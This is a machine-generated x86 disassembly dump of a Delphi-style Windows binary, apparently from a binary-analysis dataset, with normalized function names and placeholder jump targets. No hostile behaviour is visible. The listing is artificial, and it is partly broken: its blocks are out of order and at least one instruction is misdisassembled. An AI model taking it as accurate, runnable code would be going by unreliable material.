mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41936d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_4032b8
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_4043c8
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_403564
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_419298
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_409098
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419374
lea eax [ ebp - 0x14 ]
call sub_404164
retn
sub_41938b
add [ ebx + 0x53c30440 ] cl
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_419890
mov edx ebx
mov eax esi
call sub_419828
sub_4193c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_419298
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_418994
mov dl 0x1
mov eax ebx
call sub_419274
sub_4193f0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_4191a8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_41943c
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_4191a8
mov eax [ esi + 0x8 ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418e88
test bl bl
jle r-xdata
mov eax esi
call sub_419554
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_419488
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4194a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_418eb4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_419526
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419554
mov eax esi
call sub_419628
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov edx edi
mov eax esi
call sub_419630
push eax
mov eax [ ebp - 0x4 ]
call sub_419488
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_419554
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4195ae
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_418988
call sub_403368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_4195c8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx esi
call sub_4188a0
cmp ebp [ eax + 0x8 ]
je r-xdata
sub_419608
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419630
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_419644
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4196f2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_4032b8
lea edx [ ebp - 0x108 ]
mov eax edi
call sub_4043c8
mov eax ebx
mov si 0xffff
call sub_403564
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4196f9
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
mov eax ebx
mov si 0xffff
call sub_403564
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403564
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41970c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_4044e4
sub_41970c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_4041b8
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_403564
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403590
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403590
call sub_414acc
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
shl eax 0x2
call sub_4026ec
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_419809
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403590
mov edx [ ebp - 0xc ]
call sub_414cd0
movsx edi [ ebx + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40270c
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp - 0x10 ]
call sub_414d54
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
lea edx [ esi + 0x1a ]
call sub_4043c8
sub_419828
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4034f4
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418744
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_419544
xor ecx ecx
mov edx esi
mov eax ebx
call sub_4191a8
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_41882c
sub_419890
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_418988
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418a3c
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_418790
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_4191a8
mov eax ebx
call sub_419544
pop edi
pop esi
pop ebx
retn
sub_4198f4
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_419918
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_4193f0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_419960
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a4b8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418e88
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_419990
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4199b4
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_4199d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419a7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419b28
xor eax eax
push ebp
push sub_419a62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a69
mov eax [ ebp - 0x4 ]
call sub_419be4
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_419a90
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418eb4
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_419b28
xor eax eax
push ebp
push sub_419b10
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_419be4
retn
sub_419b40
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419bf8
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_419b98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41a350
mov eax [ ebp - 0x8 ]
push eax
push sub_41a600
push ebp
call sub_419b40
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419bf8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419c8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419c94
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404188
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_404570
jne r-xdata
sub_419ca4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_419ca0
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb78
jmp sub_403b1c
sub_419cdc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419d24
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405fc8
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_419ca4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419d2b
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_419d34
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419e0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419b28
xor eax eax
push ebp
push sub_419dea
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419df1
mov eax [ ebp - 0x4 ]
call sub_419be4
retn
sub_419e28
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_419e6d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404624
call sub_408bdc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419e74
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_419e7c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419f87
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_4041fc
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_404254
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419f8e
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_404188
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_404424
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_404424
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_404424
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028e8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028e8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_404424
mov ebx eax
test ebx ebx
je r-xdata
sub_419fa4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a01c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a023
lea eax [ ebp - 0xc ]
call sub_404164
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_41a030
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a0f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404684
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41a690
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_40434c
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c814
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a0fa
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404188
lea eax [ ebp - 0xc ]
call sub_404164
retn
sub_41a104
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_41a138
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41a168
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b1cc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403ae4#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a1b7
mov eax [ ebp - 0x4 ]
call sub_403368
retn
sub_41a1bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a259
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419b28
xor eax eax
push ebp
push sub_41a23c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41ad18
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_404254
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a243
mov eax [ ebp - 0x4 ]
call sub_419be4
retn
sub_41a268
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a309
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a310
lea eax [ ebp - 0x8 ]
call sub_404164
retn
mov eax [ ebp - 0x4 ]
call sub_419b28
xor eax eax
push ebp
push sub_41a2ec
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_419be4
retn
sub_41a318
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41a350
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a3f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41cf08
mov eax [ ebp - 0x4 ]
call sub_419b28
xor eax eax
push ebp
push sub_41a3cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41bfa4
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41dba8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a3d6
mov eax [ ebp - 0x4 ]
call sub_419be4
retn
sub_41a400
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b1cc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a44b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
